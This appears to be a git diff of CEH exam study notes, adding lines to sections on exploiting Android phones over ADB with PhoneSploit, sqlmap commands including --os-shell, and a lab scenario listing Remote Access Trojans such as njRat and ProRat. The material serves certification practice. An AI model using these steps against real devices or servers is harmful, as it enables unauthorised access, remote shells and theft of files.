@@ -718,10 +718,12 @@ Statistics -> Conversations -> ipv4
 
 # Exploit the Android Platform through ADB using PhoneSploit
 ```
-On attacker
+On attacker (maybe need abd connect {IP}:{port} or adb devices to check
 >cd PhoneSPloit
 >python3 phonesploit.py
 >{targetIP}
+>find ~ -type d -name "Scan" -print
+>find ~ -type d -name "Scan" -print 2>/dev/null
 >cd sdcard/Download (interesting files placed here)
 >exit
 Option 7 to take screenshot
@@ -927,6 +929,10 @@ Intercept request in Burp and copy to file (sqlmap-request.txt)
 >sqlmap -r sqlmap-request.txt --os-shell
 >sqlmap -r sqlmap-request.txt --a
 ```
+OR
+```
+
+```
 
 # Eternal Blue
 ```
@@ -1113,6 +1119,20 @@ Crack the weak credentials of wifi from a pcap file.
 A RAT server is installed on a server. Connect with it and access the file.
 - **Tips:** Scan all ports with nmap (-p-). Look for the unknown ports. Use theef RAT to connect to it.
 - **Things to google:** Create a Trojan Server using Theef RAT Trojan
+```
+njRat
+MoSucker
+ProRat (needs password)
+Theef
+HttpRat (Maybe port 80)
+
+ProRat:
+IP of victim machine (default port, or check ports open on target)
+```
+Or
+```
+Find Rat tools in shared drive E:/CEH-Tools/CEHv12 Module 07 Malware Threats/Trojan Types/Remote Access Trojans (RAT)
+```
 
 ## Example Scenario #20
 Decrypt the Veracrypt volume.
